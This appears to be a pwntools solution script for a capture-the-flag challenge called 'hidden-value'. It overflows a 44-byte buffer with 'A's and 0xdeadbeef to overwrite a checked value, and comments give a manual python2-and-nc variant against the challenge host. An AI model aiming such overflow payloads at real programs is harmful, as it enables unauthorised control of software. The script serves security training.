from pwn import *

# Start program
io = process('./hidden-value')
#io = remote('chal.tuctf.com', 30011)

# debug
context.log_level = 'debug'
buffer = 44
# Send string to overflow buffer
io.sendlineafter(b': ', b'A' * buffer + p64(0xdeadbeef)) 

# After recieving the question mark, we are sending the A's and packing 0xdeadbeef as a 64 bit address

# Receive output
print(io.recvall().decode())

# Receive the flag
io.interactive()

## manually

#python2 -c 'print 44 * "A" + "\xef\xbe\xad\xde"' > payload
#nc chal.tuctf.com 30011 < payload
